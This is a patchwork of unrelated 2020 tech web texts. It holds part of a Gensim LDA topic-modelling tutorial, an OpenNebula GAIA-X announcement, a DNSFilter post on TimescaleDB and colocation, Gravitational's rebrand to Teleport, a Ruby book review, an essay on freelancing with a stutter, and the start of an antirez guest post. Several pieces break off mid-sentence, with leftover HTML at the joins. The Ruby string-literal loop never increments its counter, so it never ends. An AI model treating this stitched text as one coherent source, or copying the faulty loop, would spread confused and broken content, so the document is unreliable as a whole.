<p>Our model will be better if the words in a topic are similar, so we will use topic coherence to evaluate our model. Topic coherence evaluates a single topic by measuring the degree of semantic similarity between high scoring words in the topic. <strong>A good model will generate topics with high topic coherence scores.</strong></p>



<pre>
coherence_model_lda = CoherenceModel(model=lda_model, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_lda = coherence_model_lda.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_lda)

Coherence Score:  <span>0.3536443343685833</span>
</pre>



<p>This is our baseline. We have just used Gensim’s inbuilt version of the <a href="https://diging.github.io/tethne/api/tutorial.mallet.html" target="_blank" rel="noreferrer noopener nofollow">LDA algorithm</a>,&nbsp;but there is an LDA model that provides better quality of topics called the <a href="https://medium.com/swlh/topic-modeling-lda-mallet-implementation-in-python-part-2-602ffb38d396"><strong>LDA Mallet Model</strong></a>.</p>



<p><strong>Let’s see if we can do better with LDA Mallet.&nbsp;</strong></p>



<pre>mallet_path = <span>'patt/to/mallet-2.0.8/bin/mallet'</span> 
ldamallet = gensim.models.wrappers.LdaMallet(mallet_path, corpus=corpus, num_topics=<span>20</span>, id2word=id2word)


pprint(ldamallet.show_topics(formatted=<span>False</span>))


coherence_model_ldamallet = CoherenceModel(model=ldamallet, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_ldamallet = coherence_model_ldamallet.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_ldamallet)

Coherence Score:  <span>0.38780981858635866</span></pre>



<p><strong>The coherence score is better! </strong>Can the score be better if we increase or decrease the number of topics? Let’s find it out by fine-tuning the model. <a href="https://www.machinelearningplus.com/nlp/topic-modeling-gensim-python/#16buildingldamalletmodel" target="_blank" rel="noreferrer noopener nofollow">This tutorial</a> provides an excellent explanation of how to tune the LDA model.

<p>Back in June we already announced that <strong>OpenNebula</strong>, as part of its <a rel="noreferrer noopener" href="https://oneedge.io/" target="_blank">ONEedge</a> initiative—the EU-funded project to build the first open source Edge Computing platform in Europe—was <a href="https://opennebula.io/opennebula-contributes-to-gaia-x/">contributing to GAIA-X</a> with its expertise in distributed and federated cloud environments, hyperconverged cloud infrastructures, complex storage and virtual networking architectures, management and automation tools for large cloud deployments, and <strong>edge computing</strong>.</p>



<p>We are now delighted to confirm that <strong>OpenNebula Systems</strong> has joined this pan-European project as a <strong>Day-1 Member of the GAIA-X AISBL</strong> (in incorporation), the international non-profit association that is going to provide a formal structure to this initiative, coordinating the efforts of the GAIA-X Community, promoting international cooperation, and developing the necessary regulatory frameworks and rules to ensure the interoperability and reliability of the providers, services and data sources made available through GAIA-X. This announcement has taken place during the <a rel="noreferrer noopener" href="https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq" target="_blank">GAIA-X Summit</a> (Nov 18-19, 2020), an event that marks an important milestone for the project! 🚀</p>



<figure><video controls="" src="https://opennebula.io/wp-content/uploads/2020/11/GaiaX_Intro.mp4"></video></figure>



<p>🇪🇺 The <a rel="noreferrer noopener" href="https://www.data-infrastructure.eu/" target="_blank">GAIA-X project</a> supports the goals of the <a rel="noreferrer noopener" href="https://ec.europa.eu/info/strategy/priorities-2019-2024/europe-fit-digital-age/european-data-strategy_en" target="_blank">European data strategy</a>, which emphasizes the economic and social opportunities of data as well as European values and laws (e.g. GDPR). The common goal of the organizations joining the project is to create GAIA-X as a basis for a sovereign, European data infrastructure, which provides interoperability between different data creating and processing entities via federated services. One of our main tasks will be to make sure that <strong>OpenNebula</strong> Cloud Service Providers and Corporate Users can get the most out of the GAIA-X federated cloud infrastructure and of the resources that will be made available through this new <strong>European virtual hyperscaler</strong>.</p>



<div><p>The <strong>OpenNebula Webinar on GAIA-X</strong> that took place on September 8, 2020 is available on demand: <a href="https://opennebula.io/webinars">https://opennebula.io/webinars</a> Many thanks to our amazing guest speakers, <strong>Andreas Weiss</strong> (Director of EuroCloud Germany) and <strong>Mirko Lampe</strong> (Coordinator of GAIA-X Workstream 2—Technical Implementation).</p><p>We have created a <strong>GAIA-X Working Group</strong> within the OpenNebula Community, so <strong>Cloud Service Providers and Corporate Users</strong> interested in GAIA-X, or planning to join this initiative, please let us know by sending an email to <a href="https://opennebula.org/contact/">community@opennebula.io</a> 📡</p></div>

You can read the </span><a href="https://fltr.ai/2OOO" target="_blank" rel="noopener"><span>original blog</span></a><span> for all the details on why we transitioned to TimescaleDB in the first place, but the main thing we were after was reliability. We’re still using TimescaleDB, and unsurprisingly we’ve made a lot of changes to our infrastructure since that original post as our total users have continued to grow. Over the last 2 years we’ve worked to optimize TimescaleDB performance, and we’ve done it all </span><i><span>without</span></i><span> clustering.</span></p><h2><span>Expectation Vs. Reality</span></h2><p><span>In 2018, I made the prediction that we could get to 3B queries per day without major structural changes to our setup. I wasn’t quite wrong, but I wasn’t totally right either.&nbsp;</span></p><p><span>After going roughly 18 months without issues (with daily queries steadily growing), we hit over 1.2B for the first time in October of 2019. It was the first sign that the actual hardware supporting TimescaleDB would have trouble getting to 3B daily queries. The server had trouble keeping up with </span><a href="https://kafka.apache.org/" target="_blank" rel="noopener"><span>Kafka</span></a><span>, and the lag was </span><i><span>hours</span></i><span> long. We weren’t losing queries like we had previously with InfluxDB, but the disk I/O of our TimescaleDB server had trouble keeping up.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="9b23b4b" data-element_type="section"><div><div><div data-id="e8c98dd" data-element_type="column"><div><div><div data-id="208228a" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="329" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" alt="TimescaleDB Performance on our old server" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w"><figcaption>You can see the server struggle in October 2019 and then hit a temporary wall in March 2020.</figcaption></figure></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="7d801f6" data-element_type="section"><div><div><div data-id="7902b84" data-element_type="column"><div><div><div data-id="3ec0127" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>We tweaked the ram usage in PostgreSQL and started to plan for a new approach.</span></p><p><span>At the time, this was just a spike in daily queries, but we knew we were approaching the moment where we would have to sustain over 1B queries daily. To help us out, we looked at setting up a virtual machine with </span><a href="https://www.digitalocean.com/" target="_blank" rel="noopener"><span>Digital Ocean</span></a><span>.</span></p><p><span>The original intention wasn’t to replace that server, it was just to take the load off of it. We wound up setting up 2 additional servers with Digital Ocean.&nbsp;</span></p><p><span>In February, our original server hit another wall and by March the Digital Ocean servers were officially online. For a few months, we had 3 TimescaleDB servers running (all receiving the same information) until it became clear the original server was no longer necessary. It wasn’t carrying much of the load anymore, and it was not as performant as the Digital Ocean servers. At that point, it was just deadweight and extra costs, so we deprecated it in June 2020.</span></p><h2><span>The spike that didn’t stop</span></h2><p><span>As of fall 2020, our daily requests have skyrocketed compared to where we were this time last year (even with that October spike in requests). To handle this sustained surge in requests, we’ve done something a little different: We now have one bare metal TimescaleDB server set up to handle </span><i><span>just</span></i><span> DNS requests. Our 2 Digital Ocean servers are currently still going strong, handling unique queries from our app and a portion of daily requests.</span></p><p><span>This change was prompted to accommodate an integration partner, but the cool thing is that we’ve actually doubled my original projection with this move. That bare metal server now processes about 6B requests per day. Granted, it does not handle the full load the Digital Ocean servers do. It handles DevOps monitoring of our infrastructure, handling far fewer read queries than our primary Digital Ocean server. Though it still processes a large number of requests daily with only 5% CPU utilization.</span></p><p><span>Meanwhile, the main Digital Ocean server rarely goes over 30% CPU utilization. Though as I’ll get into later, CPU isn’t the best metric for monitoring the health of these servers.</span></p><h2><span>The beginning of a major move to bare metal</span></h2></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="308de7c" data-element_type="section"><div><div><div data-id="746c630" data-element_type="column"><div><div><div data-id="ae9e5a0" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="576" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" alt="TimescaleDB performance on bare metal" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w"><figcaption>This is our bare metal server.

But we didn’t see that being sustainable for our business long-term.</span></p><p><span>We saw 3 possible options, and we ran costs on all of them:</span></p><ul><li><span>Colocation</span></li><li><span>Continued server rental</span></li><li><span>A major move to AWS</span></li></ul><p>Colocation was the clear winner.</p><p><span>While you need to put money down upfront, the costs begin to go down month over month. After 3 years, our server costs will be half of what they would be if we continued renting—and nearly 1/17 of what a switch to AWS would be.&nbsp;</span></p><p><span>While the monetary benefits are pretty obvious, the actual drive performance of the colocated server would be 10 times better than the AWS servers. On top of that, our setup included 648TB/month, which would have cost us $37,000 </span><i><span>alone</span></i><span> with AWS.</span></p><p><span>That bare metal server handling 6B requests daily is a </span><a href="https://netactuate.com/colocation/" target="_blank" rel="noopener"><span>colocated server</span></a><span> we built with the help of our hosting provider, </span><a href="https://netactuate.com/" target="_blank" rel="noopener"><span>NetActuate</span></a><span>.</span></p><p><span>With the performance we’re currently seeing on our bare metal server (and the cost savings), we plan on migrating </span><i><span>everything</span></i><span> from Digital Ocean to bare metal. I just don’t see anything but colocation being able to meet our needs into the future.</span></p><p><span>Using colocated servers allows us to have the fastest, newest machines at a lower cost. I told NetActuate the specs I was looking for in a server, and then their team built everything, shipped it to the data center, and racked it for us.</span></p><p><span>It’s a happy medium. I don’t want DNSFilter to be in the business of running its own datacenter. Going this route still allows me to be hands-on while not having to worry about the actual hardware day-to-day.</span></p><p><span>The main challenge for me now is hiring DevOps staff to handle ongoing infrastructure and performance management that I’ve been doing the majority of.</span></p><h2><span>Monitoring&nbsp;</span></h2><p><span>Before putting any hardware into production, first I use </span><a href="https://serverscope.io/" target="_blank" rel="noopener"><span>ServerScope</span></a><span> to understand how performant that hardware can possibly be. It also lets me know if there is anything that might indicate a defect in the hardware. That’s something that might cause limitations to the hardware’s life expectancy.</span></p><p><span>To monitor all of our servers, across both our Timescale database and our anycast network, we use </span><a href="https://www.site24x7.com/" target="_blank" rel="noopener"><span>Site24x7</span></a><span>.

You can see it held steadily around 60 MB/sec for disk writes until the end of September. That’s around the time we had a huge uptick in daily queries, causing additional strain on the server. After seeing this, we decided to add our bare metal server to start handling a large portion of DNS queries. This took some of the load off of our primary server that is still handling user interface queries (in addition to a portion of DNS requests).</span></p><p><span>However, IOPS (Input/Output Operations Per Second) is arguably the best metric to look at since databases do short bursts of access. This is in contrast to a sustained (and uninterrupted) transfer, similar to the way a file server might write information. When using ServerScope, IOPS is the most significant metric I check prior to putting a server in production. It’s valuable to know what IOPS that server is capable of handling. To get an idea of the capacity we’re looking for, </span><a href="https://www.wiredzone.com/shop/product/10028190-intel-ssdpe2ke064t8-hard-drive-nvme-6-4tb-u-2-2-5in-pcie-3-1-3d-tlc-3dwpd-dc-p4610-series-2294" target="_blank" rel="noopener"><span>one recent storage drive</span></a><span> we put into production has a random read of 654k IOPS and random write of 210k IOPS.</span></p><p><span>CPU utilization is useful to know, but really you just want to make sure that your server isn’t hitting over 80% for days or weeks at a time. That’s a sign it’s working too hard and it needs some help.&nbsp;</span></p><p><span>Another aspect we monitor is Kafka lag. What we saw in October 2019 (and later in March 2020) was TimescaleDB suddenly falling behind. In fact, it was </span><i><span>hours</span></i><span> behind. Once we saw the lag, we could investigate Disk I/O to see what the root cause of the problem was. The issue here was (again) that huge amount of new queries. TimescaleDB was suddenly writing an amount of data from Kafka it was not accustomed to writing and could not keep up. Without the ability to discover what caused the lag and subsequently working to fix it, we would have continued to get further and further behind.</span></p><h2><span>No clusters, no problem…yet</span></h2><p><span>We are still running on open source TimescaleDB after 2 years. It’s been able to handle all of the additional queries we’re now getting with our increase in users after the hardware changes I’ve talked about above. And on top of that, we haven’t used clustering </span><i><span>at all</span></i><span>.</span></p><p><span>With the announcement of </span><a href="https://blog.timescale.com/blog/timescaledb-2-0-a-multi-node-petabyte-scale-completely-free-relational-database-for-time-series/" target="_blank" rel="noopener"><span>TimescaleDB 2.0</span></a><span> and the option to use clustering for multi-node deployments in the open source version, we can continue to use open source TimescaleDB without an issue.</span></p><p><span>We’re still running a single node instance, but we do plan on implementing clusters at some point.

<p>Dear Reader,</p>

<p>Today we are officially announcing that Gravitational is becoming Teleport. As part of the transition, we are launching a new website and moving from gravitational.com to <a href="https://goteleport.com/">https://goteleport.com</a>. But that’s not the most important part.</p>

<p><img src="https://goteleport.com/blog/images/2020/gravitational-is-teleport-header.png" width="100%" alt="new teleport logo"></p>

<p>A much more interesting side of the story is why we are doing this and the new product announcements and the direction we are taking. This is an interesting journey and as we enter this new chapter, it is important to better understand these decisions.</p>

<h2 id="our-past-and-our-vision">Our Past and our Vision</h2>

<p>The Gravitational founders, like many engineers, fell in love with programming by giving a computer some instructions and watching the magic happen. The close relationship between a programmer, a machine, and code felt special.</p>

<p>We went to college and joined the workforce. We even started our own startups and witnessed the transition to horizontal scaling and cloud computing. There is no “computer” anymore that we can give instructions to. Half of our effort now goes towards erecting and continuously maintaining complex “cloud environments” for our programs. The complexity of environments is slowing us down.</p>

<p><strong>What is an environment?</strong></p>

<p>Essentially, it is a <em>custom, single-purpose computer</em> that we must build and maintain for ourselves. It is a fragile beast consisting of many “computer parts” like virtual instances, load balancers, docker registries, DNS records, SSH jump hosts, monitoring dashboards, CI/CD pipelines with blue/green deployments, network policies, plus dozens of other “parts” I will not bore you with. Some organizations, having assembled an environment some years ago, are unable to re-create one from scratch: that’s how complex these single-purpose custom “computers” tend to become.</p>

<p>We started Gravitational because we found this mess with environments…unpleasant. We liked the simplicity of giving instructions to a computer better. Can we have <em>that</em> in the modern era of cloud computing?</p>

<p>We believe the answer is yes, but we have to let go of environments and move into environment-free computing, i.e. fully embrace the promise of the cloud and <em>treat the entire planet as a single, multi-tenant computer</em>.</p>

<blockquote>
<p>Environment-free computing is like treating the entire planet as a single multi-tenant computer.</p>
</blockquote>

<p>Among other things, this planetary computer will need:</p>

<ul>
<li>An operating system</li>
<li>Convenient access</li>
</ul>

<p>What we built at Gravitational is Gravity and Teleport. The Gravity project was meant to be the “runtime” for this computer, while the goal of Teleport was to provide an easy way to access it.</p>

<p>We have enjoyed amazing success considering how young Gravitational is. What we have noticed is that Gravity’s primary use case became deploying SaaS applications into restricted environments, i.e. Gravity today enables SaaS companies to convert their offerings into downloadable software. This is fantastic, but not exactly as grand as we have imagined.</p>

<p>So it really is a no-brainer. This is why we are renaming ourselves Teleport. Teleport fulfills what we have been trying to do since we created the company - to be the first stepping stone towards environment-free computing. Gravity will still be actively supported, but we have learned from successful companies that focus is what creates great companies and today we are focused on Teleport.</p>

<h2 id="teleport-s-mission">Teleport’s Mission</h2>

<p>SaaS applications today run in custom-built, single-purpose environments that only grow over time. An environment consists of numerous components (computing instances, databases, kubernetes clusters, storage volumes, internal dashboards, etc). Let’s call them computing resources.</p>

<p>All of these resources come with a remote access protocol, and using them all is painful:</p>

<ul>
<li>Many of those have been inherited from the client-server era and do not naturally extend to cloud scale.</li>
<li>They are fragmented, as resources do not share the same authentication and authorization.</li>
<li>Some of them rely on network boundaries and protected perimeters. This is not adequate security, and it’s just plainly inconvenient.</li>
<li>They provide no discovery, so developers need to build and maintain “inventories” of resources, often one per resource type, i.e. a list of AWS accounts, a list of VMs, a list of databases, Jenkins instances, and so on.</li>
</ul>

<p>The idea of Teleport is surprisingly simple: let’s have a very smart proxy with a deep understanding of all underlying access protocols and a collection of “side cars” that can be deployed next to any computing resource. In principle, this allows a Teleport user to have instant access to any computing resource anywhere in the world. And that’s what the Teleport mission is.</p>

<blockquote>
<p>Teleport’s mission is to give developers instant access to any computing resource anywhere in the world.</p>
</blockquote>

<h2 id="unified-access-plane">Unified Access Plane</h2>

<p>Unified Access Plane is what we call the technology of accessing any computing resource located anywhere.</p>

<p>Teleport started with SSH as its only supported protocol, with Kubernetes access added recently. This brings me to other announcements we’re making today.</p>

<p>Today we are launching <a href="https://goteleport.com/teleport/application/">Application Access</a>, i.e. the ability for developers to discover and access all HTTPs endpoints of internal web applications that are running on their cloud environments, behind NAT.</p>

<p>We are also showing off the early technology preview of <a href="https://goteleport.com/teleport/docs/preview/teleport-database-access/#teleport-database-access-preview">Database Access</a>, which allows developers to enumerate and access the endpoints of databases, regardless of where they are.</p>

<p>Moreover, we’re looking to integrate <a href="https://www.teleconsole.com/">Teleconsole</a>, our laptop-to-laptop access project into Teleport mainline, so developers can temporarily grant each other secure command-line access to their laptops without having to be on the same network.</p>

<p>And that’s not all. I will keep one more announcement for dessert. Make sure to visit this blog next couple of weeks to see what else our product team will be getting out of the oven!</p>

<h2 id="conclusion">Conclusion</h2>

<p>We are now the Teleport company with the URL, goTeleport.com. Becoming a verb similar to google is what we’re after. We want all developers to instantly teleport themselves anywhere: into any environment, any resource, to anything they need to be productive.</p>

<p>So it’s easy to see how Teleport is a much better name for what we do! Try Teleport for yourself, as it’s open source and <a href="https://goteleport.com/teleport/download">available for download</a>.</p>

<p>But also, consider joining us as <a href="https://jobs.lever.co/gravitational">we’re hiring</a> for numerous positions, anywhere in the US and Canada. Yes, we also have made the transition to be a fully remote company, because how else can we build a good Teleport without having the need to use one ourselves?!</p>

<p>Ev Kontsevoy,
<del>Gravitational</del> Teleport CEO</p>

November 19, 2020 | https://www.connerjensen.com/blog/the_ruby_programming_language_review | <a href="https://web.archive.org/web/*/https://www.connerjensen.com/blog/the_ruby_programming_language_review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>My Review of The Ruby Programming Language</h3>
<p>I needed to learn Ruby for a new job I was starting, and after a quick google search I came across <em>The Ruby Programming Language</em>.</p>
<p>After ordering it off <a href="https://www.amazon.com/Ruby-Programming-Language-Everything-Need/dp/0596516177/ref=sr_1_3?dchild=1&amp;keywords=the+ruby+programming+language&amp;qid=1602857932&amp;sr=8-3">Amazon</a> and receiving it in the mail, I cracked it open and began reading.</p>
<p><strong><em>The following is a list of things that I learned from reading this book, hopefully they will be as helpful to you as they were to me.</em></strong></p>
<p>One of the first things I was curious about is how Ruby developers view documentation.</p>
<p>The book quickly answered my question by introducing me to <em>ri</em> ruby documentation tool.</p>
<h4>ri ruby documentation</h4>
<p><em>ri</em> can be invoked followed by the name of a Ruby class, module or method and you can view the documentation right there in your terminal.</p>
<pre><code>ri String
</code></pre>
<p>The next great thing this book introduced to me was the ability to run ruby with the -w flag</p>
<h4>Ruby with the -w flag</h4>
<p>Coming from a compiled language I was missing some of the feedback it gave me while writing programs.</p>
<p>The ruby -w flag will warn you about possible things that could break your program while it is executing and takes the place of helpful compile time errors/warnings</p>
<h4>All numeric objects are immutable</h4>
<p>There are no methods that allow you to change the value of a numeric object. This is nice to know when passing numeric objects around, there is no need to worry that a method will modify the numeric object.</p>
<h4>Avoid using string literals in loops</h4>
<p>String literals are mutable, therefore Ruby cannot use the same object to represent two identical string literals.</p>
<pre><code>i = 0
while i &lt; 100
    print "hello".object_id
end
</code></pre>
<p>If you are using string literals in a loop, a new string will be created for each iteration of the loop.</p>
<h4>Make a copy of an array</h4>
<p>You can make a copy of an existing array by passing it to <code>Array.new(array_to_be_copied)</code></p>
<p>This will be useful if you don't want to mutate the old array and you want to keep your methods pure.</p>
<h4>Use symbols when you don't care about content</h4>
<p>If you are using strings not for their content, but as a unique identifier, then you should use a symbol, they are cheaper and immutable by default.</p>
<h4>Most objects are passsed by reference (pass-reference-by-value)</h4>
<p>All objects, except for Fixnum, and Symbol are passed by reference, which means the method they are passed to can mutate them.</p>
<p>Changes made to an object inside a method are visible outside the methods scope.</p>
<p>Ruby actually uses <a href="https://robertheaton.com/2014/07/22/is-ruby-pass-by-reference-or-pass-by-value/">pass-reference-by-value</a> semantics, which has some subtle, but important, differences (thanks to <a href="https://news.ycombinator.com/user?id=billyruffian">billyruffian</a> for pointing this out).</p>
<h4>Difference between an Objects <strong>Class</strong> and an Objects <strong>Type</strong></h4>
<p>An object only ever has one class and it never changes throughout the life of the object.</p>
<p>An objects's type can change throughout the life of the object. Type is defined as the set of behaviors that an object responds to, or put another way, the set of methods this object has.</p>
<p>Use is _ a? to check an objects class and respond _ to? to check an objects type.</p>
<p>An Objects type is also known as duck typing, if it walks like a duck and talks like a duck, then it's a duck.</p>
<h4>Only nil and false are False</h4>
<p>The only two values in ruby that are False are nil and false. Even an empty string "" or 0 are truthy.</p>
<h4>Multiple assignment with many left values and a single right value</h4>
<pre><code>x, y, z = [1,2,3]
</code></pre>
<p>This assignment will produce the outcome of x = 1, y = 2, and z = 3</p>
<h4>The ? operator is the only ternary operator (three operands) in ruby</h4>
<pre><code>n == 1 ? 'message' : 'message'
</code></pre>
<p>This acts as a compact if/then/else statements</p>
<p>If the expression on the left evalutates to true, then the value on the left side of : is used, otherwise the value on the right side of : is used.</p>
<h4>Raising exceptions</h4>
<p>Raise an exception with <code>raise</code> method. If called with no arguments it raises a <strong>RuntimeError</strong>. If called with a single string argument it creates a new RuntimeError exception object with the specified string as its message.</p>
<h4>Handling exceptions</h4>
<p>Handle an exception with the a <code>begin</code> statement and a <code>rescue</code> clause.</p>
<pre><code>begin
  #attempt some statements
rescue
  #write your exceptions handling code here
end
</code></pre>
<h4>Name the exception object</h4>
<p>You can name the exception in the rescue clause, then use it in your exception handling code.</p>
<pre><code>begin
  #attempt some statements
rescue =&gt; ex
  #handle the exception here
  puts "#{ex.class}: #{ex.message}"
end
</code></pre>
<h4>Using Proc objects</h4>
<p>If you have the following code</p>
<pre><code>a, b = [1,2,3], [4,5]
sum = a.inject(0) { |total, x| total + x }
sum = b.inject(sum) { |total, x| total + x }
</code></pre>
<p>You can remove the duplication of the blocks by creating a proc object</p>
<pre><code>summation = Proc.new { |total, x| total +x }
</code></pre>
<p>Then, as long as you prefix it with &amp;, you can pass this proc Object as the last parameter of any method invocation,</p>
<pre><code>sum = a.inject(0, &amp;summation)
sum = b.inject(sum, &amp;summation)
</code></pre>
<h4>Return statements in blocks and Procs</h4>
<p>Using <code>return</code> in a block will not only return to the invoking iterator, but it also returns from the method that invoked the iterator</p>
<p>Using <code>return</code> in a Proc has the same behavior, but with some added complexity.</p>
<p>Because turning a block into a Proc object allows us to pass this Proc object around to other methods, when the Proc object calls <code>return</code> it may attempt to return from a method call that has already been returned from. This will raise a <strong><em>LocalJumpError</em></strong></p>
<h4>Return statements in Lambdas</h4>
<p>Because lambdas are much like methods, using <code>return</code> in a lambda will work like a <code>return</code> statement in a method. It will return control to the enclosing scope in which the lambda was called in.</p>
<p>This makes it so we never need to worry about a <strong><em>LocalJumpError</em></strong></p>
<h3>Conclusion</h3>
<p>Hopefully, you learned something new from this post, I would highly recommend picking up <em>The Ruby Programming Language</em> it has much more to offer and does an excellent job of teaching the intricacies of the language.</p>
<p>Thanks for reading!</p>
<p>I will be following this post up with another post about what I'm learning from <em>The Ruby Programming Language</em> so keep an eye out for that.</p>

                <p>November 18, 2020</p>

                <p>For the last couple of years the bulk of my income has come from freelancing as a UI developer, the flexibility is great and gives me time to work on my side projects while I try to make it as an <a href="https://www.producthunt.com/@chrispattle">indie hacker</a>.  However freelancing hasn't come without its challenges, namely as the title suggests, my annoying stutter.</p>

                <p>I've had a stutter since the age of 6, I don't know what triggered it although I think a lot of children develop speech problems at some point in their childhood just that the majority overcome it, but I guess I didn't oh well.</p>

                <p>Anyway it is what it is, everyone has problems in life and I don't like to play top trumps.  I thought I'd just take some time to share my experiences and perspective on living with a stutter.</p>

                <h4>The Con's</h4>

                <p>Unfortunately for me most business is done face to face as it builds trust, I've found out that it's very hard to convince people to spend a couple of grand on a piece of work if you've only been communicating over email.</p>

                <p>This means when taking on a new client I know there's at least going to be one phone / video call, which I normally try to schedule in the morning so I'm not sat worrying about it all day.  I'd say my symptoms are medium to severe (when I'm at my worst) but it's hard to sound professional when you are blocking on every 2 / 3 words.</p>

                <p>The overriding emotions of having a stammer are fear, shame and guilt.  I desperately want to come across as a confident fluent speaker who's knowledgeable about their craft but that's not always possible.</p>

                <h4>The pros</h4>

                <p>It's not all doom and gloom, there are some pros to having a stutter.</p>

                <p>Because I've spent a lot of years trying to avoid verbal communication it does mean that I've worked hard to make my written communication (emails, chat etc) as clear and concise as possible.  If I can remove any ambiguity out of a conversation there's less chance a call will be needed to clarify anything.</p>

                <p>I'm also lucky that I work in an industry where my output is clear to see and you can interact with it.  Having a great portfolio that showcases your ability goes a long way to selling your services.  Whereas someone else might rely on their sales patter to bring in work I can't do that so I've just tried to build a portfolio that sells itself.</p>

                <p>I don't know if this can be considered a pro and I don't know how much truth there is to this but my speech impediment probably makes me stand out a bit more. Hypothetically if I was interviewing for a job alongside a bunch of other candidates, where I opened up about my stammer, they're more likely to remember my name.  People love honesty and you have to find a way to turn what on the surface looks like a disadvantage into an advantage.</p>

                <h4>The solution</h4>

                <p>There's no cure for stuttering but I have come across some tips and techniques that help.  It sounds so simple but what helped me the most was just accepting the fact that I have a stammer and being open and honest with myself and my clients.  Previously I would never bring it up and just tried to muddle my way through calls and meetings even though it was clear to both parties I was struggling.</p>

                <p>It's only really in the last year that I've started disclosing my stutter when I first speak with a client, it puts me at ease and no doubt does the same for them.  If you're visually imparied you wouldn't carry out your life as if you had 20 \ 20 vision and it's no different for me.  I'm never going to be a fluent speaker so why pretend as if I am?  I so wish I could have had this epiphany 10 years ago.</p>

                <p>Another technique I've employed is to always push for face to face meetings when seeing a prospective client or catching up with an existing one.  For a stutterer the phone is our worst enemy, it gives you that deer caught in the headlights feeling when it's your turn to speak and my throat and body tense up.  Conversing in person is always a lot easier, it's hard to pinpoint why but I just feel more relaxed.  It's also surprising how much we communicate through our body language.</p>

                <p>There are always problems in life, it's how well we react to them that matters.</p>

                <h4>Wrapped it up</h4>

                <p>To conclude, it's hard to know what impact this has had on my career.  It's never cost me any clients, that is to say it's never put anyone off working with me that I can recall but it has held me back at times.</p>

November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
